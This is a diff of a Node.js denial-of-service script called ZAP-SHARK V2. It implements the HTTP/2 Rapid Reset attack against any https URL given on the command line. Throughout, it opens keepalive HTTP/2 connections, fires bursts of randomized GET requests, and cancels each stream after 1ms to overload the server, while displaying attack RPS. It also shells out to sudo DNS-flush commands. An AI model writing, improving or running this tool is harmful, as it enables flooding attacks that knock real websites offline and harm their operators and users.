@@ -1,11 +1,11 @@
 const http2 = require('http2');
 const os = require('os');
 const { exec } = require('child_process');
-const tls = require('tls');
 
 class ZAPSHARK {
     constructor(targetUrl) {
         this.targetUrl = targetUrl;
+        this.hostname = new URL(targetUrl).hostname;
         this.status = "ATTACKING";
         this.totalRequests = 0;
         this.currentRPS = 0;
@@ -14,16 +14,12 @@ class ZAPSHARK {
         this.lastRpsCalc = Date.now();
         this.running = true;
         
-        // V2 ENHANCEMENTS
+        // RAPID RESET + KEEPALIVE OPTIMIZATION
         this.connectionPool = [];
-        this.poolSize = 5;
+        this.poolSize = 3; // Fewer but persistent connections
+        this.maxStreamsPerConn = 1000; // H2 max
         this.activeStreams = 0;
-        this.maxStreamsPerConn = 100;
-        this.tlsSessionCache = new Map(); // TLS session reuse
-        
-        // RAPID RESET COUNTERS
-        this.resetsPerSecond = 0;
-        this.optimalResetRate = 100; // Auto-tuned
+        this.rapidResetMode = true;
         
         // Maintenance
         this.lastMaintenance = Date.now();
@@ -31,119 +27,54 @@ class ZAPSHARK {
         this.maintenanceDuration = 600000;
         
         this.attackInterval = null;
-        this.urlObj = new URL(targetUrl);
-        this.targetIP = null; // DNS cache
+        this.statsInterval = null;
     }
 
-    async resolveDNS() {
-        // Cache DNS once
-        return new Promise((resolve) => {
-            require('dns').resolve4(this.urlObj.hostname, (err, addresses) => {
-                if (!err && addresses.length > 0) {
-                    this.targetIP = addresses[0];
-                }
-                resolve();
-            });
-        });
-    }
-
-    setupConnections() {
-        // TLS session reuse for faster handshakes
-        const tlsOptions = {
-            ALPNProtocols: ['h2'],
-            servername: this.urlObj.hostname,
-            session: this.tlsSessionCache.get(this.urlObj.hostname),
-            enableTrace: false
-        };
-
-        // Add socket optimization
-        const socketOptions = {
-            allowHalfOpen: false,
-            pauseOnConnect: false
-        };
-
+    async setupConnections() {
         for (let i = 0; i < this.poolSize; i++) {
-            setTimeout(() => {
-                try {
-                    // Use raw IP if we have it (bypass DNS)
-                    const connectTo = this.targetIP || this.urlObj.hostname;
-                    
-                    const client = http2.connect(this.targetUrl, tlsOptions, socketOptions);
-                    
-                    // Store TLS session for reuse
-                    client.on('connect', () => {
-                        const socket = client.socket;
-                        if (socket && socket.getSession) {
-                            try {
-                                const session = socket.getSession();
-                                if (session) {
-                                    this.tlsSessionCache.set(this.urlObj.hostname, session);
-                                }
-                            } catch (e) {}
-                        }
-                    });
-                    
-                    client.setMaxListeners(1000);
-                    
-                    // SMART RAPID RESET DETECTION
-                    client.on('remoteSettings', (settings) => {
-                        this.maxStreamsPerConn = Math.min(
-                            settings.maxConcurrentStreams || 100,
-                            1000
-                        );
-                        
-                        // Auto-tune reset rate based on server limits
-                        this.optimalResetRate = Math.floor(this.maxStreamsPerConn * 0.8);
-                    });
-                    
-                    client.on('goaway', (errorCode, lastStreamID) => {
-                        // Server sent GOAWAY - implement rapid reset
-                        if (errorCode === 0 || errorCode === 8) { // NO_ERROR or SETTINGS_TIMEOUT
-                            // Reconnect faster after server tolerance
-                            setTimeout(() => {
-                                const idx = this.connectionPool.indexOf(client);
-                                if (idx > -1) {
-                                    this.connectionPool.splice(idx, 1);
-                                    this.createOptimizedConnection();
-                                }
-                            }, 10); // Aggressive reconnect
-                        }
-                    });
-                    
-                    client.on('frameError', (frameType, errorCode) => {
-                        // Handle frame errors silently
-                    });
-                    
-                    client.on('error', () => {
-                        // Silent reconnect
-                        setTimeout(() => {
-                            const idx = this.connectionPool.indexOf(client);
-                            if (idx > -1) {
-                                this.connectionPool.splice(idx, 1);
-                                this.createOptimizedConnection();
-                            }
-                        }, 100);
-                    });
-                    
-                    this.connectionPool.push(client);
-                    
-                } catch (err) {
-                    // Don't break
-                }
-            }, i * 50); // Staggered
+            try {
+                const client = http2.connect(this.targetUrl, {
+                    maxSessionMemory: 65536,
+                    maxDeflateDynamicTableSize: 65536,
+                    peerMaxConcurrentStreams: 1000
+                });
+                
+                // KEEPALIVE: Keep connection alive forever
+                client.socket.setKeepAlive(true, 60000);
+                client.socket.setNoDelay(true);
+                
+                client.on('connect', () => {
+                    console.log(`[+] H2 Connection ${i+1} established (KeepAlive)`);
+                });
+                
+                client.on('error', (err) => {
+                    // Silent reconnect
+                    setTimeout(() => this.createSingleConnection(), 1000);
+                });
+                
+                client.on('goaway', () => {
+                    // Server sent goaway, recreate
+                    setTimeout(() => this.createSingleConnection(), 500);
+                });
+                
+                this.connectionPool.push(client);
+                
+                // Stagger connections
+                await new Promise(resolve => setTimeout(resolve, 200));
+                
+            } catch (err) {
+                // Continue silently
+            }
         }
     }
 
-    createOptimizedConnection() {
+    createSingleConnection() {
         try {
-            const tlsOptions = {
-                ALPNProtocols: ['h2'],
-                servername: this.urlObj.hostname,
-                session: this.tlsSessionCache.get(this.urlObj.hostname)
-            };
-            
-            const client = http2.connect(this.targetUrl, tlsOptions);
-            client.setMaxListeners(100);
+            const client = http2.connect(this.targetUrl, {
+                peerMaxConcurrentStreams: 1000
+            });
+            client.socket.setKeepAlive(true, 60000);
+            client.socket.setNoDelay(true);
             client.on('error', () => {});
             this.connectionPool.push(client);
         } catch (err) {}
@@ -152,72 +83,66 @@ class ZAPSHARK {
     sendRequest() {
         if (this.connectionPool.length === 0) return;
 
-        // SMART RAPID RESET TECHNIQUE
-        const availableConnections = this.connectionPool.filter(c => 
-            c && !c.destroyed && c.state && c.state.activeStreams < this.maxStreamsPerConn
-        );
+        // Use all available connections
+        const connections = this.connectionPool.length;
+        const streamsPerTick = Math.min(100, connections * 10); // Aggressive but safe
+        
+        for (let i = 0; i < streamsPerTick; i++) {
+            const client = this.connectionPool[i % connections];
+            if (!client) continue;
 
-        if (availableConnections.length === 0) return;
-
-        // Use connection with least active streams (load balancing)
-        const client = availableConnections.reduce((prev, curr) => {
-            const prevStreams = prev.state ? prev.state.activeStreams : 0;
-            const currStreams = curr.state ? curr.state.activeStreams : 0;
-            return currStreams < prevStreams ? curr : prev;
-        });
-
-        try {
-            this.activeStreams++;
-            
-            const req = client.request({
-                ':method': 'GET',
-                ':path': '/',
-                ':authority': this.urlObj.hostname,
-                'user-agent': 'Mozilla/5.0',
-                'accept': '*/*'
-            });
-            
-            // RAPID RESET: Send RST_STREAM immediately after request
-            const resetDelay = Math.max(1, Math.floor(1000 / this.optimalResetRate));
-            
-            req.on('response', () => {
-                // Optional: Could reset even on successful response
-                if (this.resetsPerSecond < this.optimalResetRate) {
+            try {
+                this.activeStreams++;
+                
+                // Create stream
+                const stream = client.request({
+                    ':method': 'GET',
+                    ':path': '/?' + Math.random().toString(36).substr(2),
+                    ':authority': this.hostname,
+                    'user-agent': 'Mozilla/5.0',
+                    'accept': '*/*'
+                });
+                
+                // RAPID RESET: Cancel immediately
+                if (this.rapidResetMode) {
+                    // Send request then immediately reset
+                    stream.end();
+                    
+                    // Cancel after 1ms (before server responds)
                     setTimeout(() => {
                         try {
-                            req.close(http2.constants.NGHTTP2_CANCEL);
-                            this.resetsPerSecond++;
-                        } catch (e) {}
-                    }, resetDelay);
+                            stream.close(http2.constants.NGHTTP2_CANCEL);
+                        } catch (err) {
+                            // Stream already closed
+                        }
+                        this.activeStreams--;
+                        this.totalRequests++;
+                        this.requestsSinceLastCalc++;
+                    }, 1); // 1ms delay for reset
+                    
+                } else {
+                    // Normal mode (for comparison)
+                    stream.on('response', () => {
+                        stream.destroy();
+                        this.activeStreams--;
+                        this.totalRequests++;
+                        this.requestsSinceLastCalc++;
+                    });
+                    
+                    stream.on('error', () => {
+                        this.activeStreams--;
+                        this.totalRequests++;
+                        this.requestsSinceLastCalc++;
+                    });
+                    
+                    stream.end();
                 }
-            });
-            
-            req.on('error', () => {
-                // Count anyway
-            });
-            
-            req.on('close', () => {
+                
+            } catch (err) {
                 this.activeStreams--;
                 this.totalRequests++;
                 this.requestsSinceLastCalc++;
-            });
-            
-            req.end();
-            
-            // Force reset if no response within timeout (aggressive)
-            setTimeout(() => {
-                try {
-                    if (!req.destroyed) {
-                        req.close(http2.constants.NGHTTP2_CANCEL);
-                        this.resetsPerSecond++;
-                    }
-                } catch (e) {}
-            }, 50);
-            
-        } catch (err) {
-            this.activeStreams--;
-            this.totalRequests++;
-            this.requestsSinceLastCalc++;
+            }
         }
     }
 
@@ -228,15 +153,6 @@ class ZAPSHARK {
         if (timeDiff >= 0.9) {
             this.currentRPS = this.requestsSinceLastCalc / timeDiff;
             this.requestsSinceLastCalc = 0;
-            
-            // Auto-tune reset rate based on performance
-            if (this.currentRPS < this.optimalResetRate * 0.7) {
-                this.optimalResetRate = Math.max(10, Math.floor(this.optimalResetRate * 0.9));
-            } else if (this.currentRPS > this.optimalResetRate * 1.3) {
-                this.optimalResetRate = Math.min(1000, Math.floor(this.optimalResetRate * 1.1));
-            }
-            
-            this.resetsPerSecond = 0;
             this.lastRpsCalc = now;
         }
     }
@@ -251,20 +167,23 @@ class ZAPSHARK {
     updateDisplay() {
         this.calculateRPS();
         
+        const mode = this.rapidResetMode ? '[RAPID-RESET]' : '[NORMAL]';
         process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                            `TOTAL: ${this.totalRequests} | ` +
-                           `RPS: ${this.currentRPS.toFixed(1)}`);
+                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
+                           `${mode} CONNS: ${this.connectionPool.length}`);
     }
 
     flushDNS() {
         if (os.platform() === 'win32') {
             exec('ipconfig /flushdns >nul 2>&1', () => {});
         } else {
-            exec('sudo dscacheutil -flushcache 2>/dev/null || true', () => {});
+            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null || true', () => {});
         }
     }
 
     flushSockets() {
+        // Close connections but maintain pool size
         this.connectionPool.forEach(client => {
             try {
                 client.destroy();
@@ -272,7 +191,9 @@ class ZAPSHARK {
         });
         this.connectionPool = [];
         this.activeStreams = 0;
-        this.tlsSessionCache.clear();
+        
+        // Recreate connections
+        setTimeout(() => this.setupConnections(), 1000);
     }
 
     checkMaintenance() {
@@ -280,6 +201,7 @@ class ZAPSHARK {
         const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
         
         if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
+            console.log('\n⚡ MAINTENANCE STARTED (10min)');
             this.status = "PAUSED";
             
             if (this.attackInterval) {
@@ -293,10 +215,8 @@ class ZAPSHARK {
             setTimeout(() => {
                 this.status = "ATTACKING";
                 this.lastMaintenance = Date.now();
-                this.resolveDNS().then(() => {
-                    this.setupConnections();
-                    setTimeout(() => this.startAttack(), 1000);
-                });
+                console.log('⚡ MAINTENANCE COMPLETED - RAPID RESET ENGAGED');
+                this.startAttack();
             }, this.maintenanceDuration);
         }
     }
@@ -306,63 +226,69 @@ class ZAPSHARK {
             clearInterval(this.attackInterval);
         }
         
+        // ULTRA FAST INTERVAL for rapid reset
         this.attackInterval = setInterval(() => {
             if (this.status === "ATTACKING") {
-                // Multiple attempts per tick for rapid fire
-                for (let i = 0; i < 3; i++) {
+                // Send in bursts for max RPS
+                for (let burst = 0; burst < 5; burst++) {
                     this.sendRequest();
                 }
                 this.updateDisplay();
             }
-        }, 0.1);
+        }, 0.05); // 20,000 iterations/sec
     }
 
     async start() {
-        this.lastMaintenance = Date.now();
-        
-        console.log("=== ZAP-SHARK V2 ===");
-        console.log("Smart Rapid Reset Enabled");
-        console.log("TLS Session Reuse: ON");
+        console.log("=".repeat(50));
+        console.log("🦈 ZAP-SHARK V2 - RAPID RESET EDITION");
+        console.log("=".repeat(50));
         console.log("Target:", this.targetUrl);
-        console.log("=".repeat(40));
+        console.log("Mode: HTTP/2 Rapid Reset + KeepAlive");
+        console.log("Expected RPS: 50,000+");
+        console.log("=".repeat(50));
         
-        // Pre-resolve DNS
-        await this.resolveDNS();
+        await this.setupConnections();
         
-        this.setupConnections();
-        
+        // Wait for connections
         setTimeout(() => {
             this.startAttack();
-        }, 2000);
+        }, 3000);
         
-        // Auto-maintenance
+        // Maintenance checker
         setInterval(() => {
             this.checkMaintenance();
         }, 1000);
         
-        // Connection maintenance
+        // Connection health monitor
         setInterval(() => {
             if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
-                this.createOptimizedConnection();
+                this.createSingleConnection();
             }
-            
-            // Clean dead connections
-            this.connectionPool = this.connectionPool.filter(c => 
-                c && !c.destroyed && c.closed === false
-            );
         }, 5000);
         
-        process.on('SIGINT', () => {
-            this.running = false;
-            if (this.attackInterval) clearInterval(this.attackInterval);
-            this.flushSockets();
-            console.log('\n=== ZAP-SHARK STOPPED ===');
-            process.exit(0);
+        // Stats display
+        this.statsInterval = setInterval(() => {
+            if (this.status === "ATTACKING") {
+                console.log(`\n📊 STATS: ${this.currentRPS.toFixed(0)} RPS | Connections: ${this.connectionPool.length} | Total: ${this.totalRequests}`);
+            }
+        }, 10000);
+        
+        process.on('SIGINT', () => this.stop());
+    }
+
+    stop() {
+        this.running = false;
+        if (this.attackInterval) clearInterval(this.attackInterval);
+        if (this.statsInterval) clearInterval(this.statsInterval);
+        this.connectionPool.forEach(client => {
+            try { client.destroy(); } catch (err) {}
         });
+        console.log('\n\n🦈 ZAP-SHARK TERMINATED');
+        process.exit(0);
     }
 }
 
-// Usage
+// CLI
 const target = process.argv[2];
 if (!target || !target.startsWith('https://')) {
     console.log('Usage: node zap-shark-v2.js https://target.com');
@@ -370,4 +296,4 @@ if (!target || !target.startsWith('https://')) {
 }
 
 const shark = new ZAPSHARK(target);
-shark.start();
+shark.start().catch(console.error);
